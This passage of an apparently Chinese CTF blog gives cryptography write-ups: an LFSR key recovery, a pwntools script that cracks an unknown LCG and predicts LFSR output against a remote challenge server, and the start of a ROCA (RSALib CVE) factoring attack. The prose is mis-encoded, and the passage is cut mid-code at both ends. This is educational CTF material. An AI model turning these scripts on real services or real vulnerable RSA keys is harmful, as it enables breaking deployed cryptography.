f.write(r)</span><br></pre></td></tr></table></figure><p>BMç®—æ³•çš„å‰ææ˜¯è¦æœ‰$2\cdot LENGTH$ä¸ªè¿ç»­æ¯”ç‰¹ï¼Œè€Œå¯†æ–‡ä»…ç»™å‡º$2\cdot LENGTH-8$ä¸ªè¿ç»­æ¯”ç‰¹</p><p>å› æ­¤é€šè¿‡çˆ†ç ´æœ«å°¾8ä¸ªæ¯”ç‰¹æ ¡éªŒ<code>FLAG[7:11]==&#39;1224&#39;</code></p><p>æœ¬é¢˜ç±»ä¼¼<a href="https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsr---known-plain-attack" target="_blank" rel="noopener">https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsrâ€”-known-plain-attack</a></p><p>åŸç†å¯å‚ç…§<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/#bm-algorithm" target="_blank" rel="noopener">WIKI</a></p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[88]:</span></span><br><span class="line">cipher = open(<span class="string">'output'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[89]:</span></span><br><span class="line">cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[90]:</span></span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">X = []</span><br><span class="line">S = []</span><br><span class="line">LENGTH = <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">    X.append(cipher[i : i + LENGTH])</span><br><span class="line">    S.append(cipher[i + LENGTH])</span><br><span class="line">X = Matrix(F2, X)</span><br><span class="line">S = Matrix(F2, S)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[91]:</span></span><br><span class="line">X, S</span><br><span class="line"><span class="comment"># Out[91]:</span></span><br><span class="line">(<span class="number">248</span> x <span class="number">256</span> dense matrix over Finite Field of size <span class="number">2</span>,</span><br><span class="line"> <span class="number">1</span> x <span class="number">248</span> dense matrix over Finite Field of size <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[92]:</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[93]:</span></span><br><span class="line">suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[94]:</span></span><br><span class="line">MASK = []</span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">    X_n = X</span><br><span class="line">    c = cipher + list(suf)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">8</span>):</span><br><span class="line">        v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">        X_n = X_n.stack(v)</span><br><span class="line">    S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-8</span>:]).T</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msk = X_n.solve_right(S_n)</span><br><span class="line">        MASK.append(msk.T)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[95]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == LENGTH)</span><br><span class="line">    cur = cipher</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">        left = right.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line">        key = str(left) + key</span><br><span class="line">        cur = [left] + cur[:<span class="number">-1</span>]</span><br><span class="line">    key = int(key, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[96]:</span></span><br><span class="line">KEY = []</span><br><span class="line"><span class="keyword">for</span> msk <span class="keyword">in</span> MASK:</span><br><span class="line">    feedback = []</span><br><span class="line">    fb = list(msk[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        <span class="keyword">if</span> fb[i] == <span class="number">1</span>:</span><br><span class="line">            feedback.append(i)</span><br><span class="line">    feedback.append(LENGTH)</span><br><span class="line">    delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line">    KEY.append(decrypt(cipher[:LENGTH], feedback))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[97]:</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[98]:</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> KEY:</span><br><span class="line">    flag = hashlib.sha256(hex(k)[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">4</span>] == <span class="string">"1224"</span>:</span><br><span class="line">        print(<span class="string">"de1ctf&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># de1ctf&#123;1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ç½‘é¼æ¯2020æœ±é›€ç»„-guess-game"><a href="#ç½‘é¼æ¯2020æœ±é›€ç»„-guess-game" class="headerlink" title="ç½‘é¼æ¯2020æœ±é›€ç»„ - guess_game"></a>ç½‘é¼æ¯2020æœ±é›€ç»„ - guess_game</h3><h4 id="é¢˜ç›®è€ƒç‚¹-1"><a href="#é¢˜ç›®è€ƒç‚¹-1" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>LCG - unknown (a, b, m)</li><li>BM algorithm</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-1"><a href="#é¢˜ç›®æ–‡ä»¶-1" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p>å¹¶ä¸æ˜¯æœ±é›€ç»„der- -èµ›ä¸­VğŸ‘´åˆ†äº«äº†ä¸‹ï¼Œè™½ç„¶éƒ½æ˜¯å·²çŸ¥è€ƒç‚¹ï¼Œä½†è¿‡ç¨‹è¿˜æ˜¯æœ‰ç‚¹ç¹ç</p><p>äºæ˜¯è‡ªå·±å†™dockerfileåšäº†ä¸‹å¤ç°</p><p><a href="dockerfile.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><code>configure</code>é€‰å–Game Levelæ—¶ï¼Œå…¶å¯¹åº”çš„level codeæ˜¯ç”±LCGç”Ÿæˆçš„ï¼Œæ‰€æœ‰å‚æ•°å‡æœªçŸ¥ï¼Œä½†å›æ˜¾ç»™å‡ºè¿ç»­å…­ä¸ªæ•°æ®ï¼Œé‡‡ç”¨ä¹‹å‰æåˆ°çš„trickå³å¯ï¼Œ<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcg---unknown-a-b-m" target="_blank" rel="noopener">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcgâ€”-unknown-a-b-m</a></p><p>LCG crackæˆåŠŸä»¥åï¼Œæ‹¿åˆ°çš„levelå¯¹åº”coinä¸º10ï¼Œå› æ­¤åœ¨LFSR predictæ—¶å¯ä»¥ç”¨9ä¸ªcoinå»æ¢è¿ç»­9ä¸ªLFSRè¾“å‡ºï¼Œå³å¾—åˆ°è¿ç»­72bits.</p><p>çŸ¥n=39ï¼ŒBM algorithm(æœ«å°¾6bitsé‡‡ç”¨çˆ†ç ´)å³å¯â€¦ä½†ä»…ä½™1ä¸ªcoinï¼Œæ‰€ä»¥ä»BMçš„å¤šç»„è§£ä¸­éšæœºé€‰æ‹©å‘é€ï¼Œå¤±è´¥å³é‡æ–°remote.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> re, itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LCG</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">        data.append(int(io.recvline().strip()))</span><br><span class="line">    delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">    m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">    m = reduce(GCD, m_mul)</span><br><span class="line">    factors = factor(m)</span><br><span class="line">    <span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">if</span> size(prime) == <span class="number">64</span>:</span><br><span class="line">                m = prime</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            m //= (prime**degree)</span><br><span class="line">    s0, s1, s2 = data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>]</span><br><span class="line">    A = Matrix([</span><br><span class="line">        [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">        [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">        [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">    ])</span><br><span class="line">    A = A.LLL()</span><br><span class="line">    a, b = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">                a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">                a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">        print(<span class="string">"[!] crack_LCG failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    a %= m</span><br><span class="line">    b %= m</span><br><span class="line">    res = (a * data[<span class="number">-1</span>] + b) % m</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the level code:\n"</span>, str(res))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LFSR</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"Input your answer:\n"</span>, <span class="string">"2333"</span>)</span><br><span class="line">        ct = int(re.findall(<span class="string">r"\d+"</span>, io.recvline().decode(<span class="string">"utf-8"</span>))[<span class="number">0</span>])</span><br><span class="line">        cipher += bin(ct)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">"0"</span>)</span><br><span class="line">    cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == <span class="number">72</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LFSR</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    X, S = [], []</span><br><span class="line">    LENGTH = <span class="number">39</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">        X.append(cipher[i : i + LENGTH])</span><br><span class="line">        S.append(cipher[i + LENGTH])</span><br><span class="line">    X, S = Matrix(F2, X), Matrix(F2, S)</span><br><span class="line">    suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">6</span>))</span><br><span class="line">    MASK = []</span><br><span class="line">    <span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">        X_n = X</span><br><span class="line">        c = cipher + list(suf)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">6</span>):</span><br><span class="line">            v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">            X_n = X_n.stack(v)</span><br><span class="line">        S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-6</span>:]).T</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msk = X_n.solve_right(S_n)</span><br><span class="line">            MASK.append(msk.T)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> MASK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_LFSR</span><span class="params">(ct, msk)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    nxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        x = F2(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">            x += ct[j] * msk[j]</span><br><span class="line">        ct = ct[<span class="number">1</span>:] + [int(x)]</span><br><span class="line">        nxt += (int(x) &lt;&lt; (<span class="number">7</span> - i))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your answer:\n"</span>, str(nxt))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Right!"</span> <span class="keyword">in</span> io.recvline().decode(<span class="string">"utf-8"</span>):</span><br><span class="line">        <span class="keyword">return</span> ct</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] predict_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> crack_LCG():</span><br><span class="line">        print(<span class="string">"[+] crack_LCG success."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    cipher = get_LFSR()</span><br><span class="line">    MASK = crack_LFSR(cipher)</span><br><span class="line">    <span class="keyword">if</span> len(MASK):</span><br><span class="line">        print(<span class="string">"[+] &#123;&#125; masks have been found."</span>.format(len(MASK)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] crack_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ct = cipher[<span class="number">-39</span>:]</span><br><span class="line">    msk = list(MASK[randrange(<span class="number">0</span>, len(MASK))][<span class="number">0</span>])</span><br><span class="line">    <span class="comment">#msk = list(MASK[0][0])</span></span><br><span class="line">    ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ct:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">498</span>):</span><br><span class="line">            ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> main() == <span class="literal">False</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        print(cnt)</span><br><span class="line">        io.close()</span><br><span class="line">        io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>é‡è¿å¤§æ¦‚äºŒä¸‰åæ¬¡æ‹¿åˆ°flagâ€¦u1s1ç½‘é¼å‡ºé¢˜äººæ²¡ä¸€ä¸ªæ­£å¸¸çš„</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-18_17-05-09.png" alt></p><h3 id="GKCTF2020-Backdoor"><a href="#GKCTF2020-Backdoor" class="headerlink" title="GKCTF2020 - Backdoor"></a>GKCTF2020 - Backdoor</h3><h4 id="é¢˜ç›®è€ƒç‚¹-2"><a href="#é¢˜ç›®è€ƒç‚¹-2" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>ROCA (RSALib - CVE)</li><li>PH</li><li>Coppersmith</li></ul><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>è¿™é¢˜å…¶å®è¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„- -åªæ˜¯è¿™ä¸ªCVEæŠ«éœ²å‡ºæ¥ä»¥ågithubæ—©æœ‰å®Œæ•´çš„è½®å­ï¼ˆpaperé¢˜è¢«ç§’emmm</p><p>åœ¨æ­¤å€Ÿé‰´paperåŠgithubä¸Šçš„è„šæœ¬è¿›è¡Œé€‚å½“åˆ†æï¼š</p><p>RSALibç”Ÿæˆå¤§ç´ æ•°çš„è§„åˆ™å¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">N=(km+(65537^{a})\%M)(lm+(65537^{b})\%M)\equiv 65537^{a+b}(mod\ M).</script><p>ä¸”Mæ˜¯å‰nä¸ªç´ æ•°çš„ä¹˜ç§¯ï¼ˆnæ˜¯æœ‰å…³size(N)çš„å®šå€¼ï¼‰ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/image-20200525234153390.png" alt></p><p>ç”±äºMè¶³å¤Ÿå…‰æ»‘ï¼Œæ‰€ä»¥PHæ±‚è§£DLPå¾—åˆ°c=a+bï¼Œå†åœ¨$(\frac{c}{2},\frac{c+ord}{2})$ä¸Šçˆ†ç ´aï¼Œè¿›è¡ŒCoppersmithæ±‚è§£kå³å¯.</p><p>ä½†å¯¹äºç°æœ‰çš„Mï¼Œ$ord_{M}(65537)$è¿‡å¤§ï¼Œè€ŒCoppersmith partial pçš„ç•Œè¿˜å¾ˆå®½è£•ï¼Œå› æ­¤æˆ‘ä»¬è€ƒè™‘å–å¾—Mçš„å› å­Mâ€™ï¼Œä½¿å¾—$ord_{Mâ€™}(65537)$åœ¨æ»¡è¶³$size(Mâ€™)\geq size(N^{\frac{1}{4}})$çš„æƒ…å†µä¸‹å°½å¯èƒ½çš„å°.ï¼ˆæ­¤ç•Œçš„ä¼°è®¡å‚è€ƒ<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p" target="_blank" rel="noopener">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p</a>ï¼‰</p><p><strong>Get Mâ€™ smaller than M (prepared for Coppersmith)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></span><br><span class="line">M = <span class="number">0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_power_factor</span><span class="params">(n)</span>:</span></span><br><span class="line">    div = []</span><br><span class="line">    <span class="keyword">for</span> (p, r) <span class="keyword">in</span> factor(n):</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            div.append(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            div = div + [p**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, r + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> div[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># divided by divisor(p) such that ord_p(65537)\nmid order</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_Gen_M_smaller</span><span class="params">(M, order)</span>:</span></span><br><span class="line">    M_factor = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> M.factor()]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> M_factor:</span><br><span class="line">        p_order = Zmod(p)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">        <span class="keyword">if</span> order % p_order != <span class="number">0</span>:</span><br><span class="line">            M //= p</span><br><span class="line">    <span class="keyword">return</span> M, Zmod(M)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get M' smaller than M</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gen_M_smaller</span><span 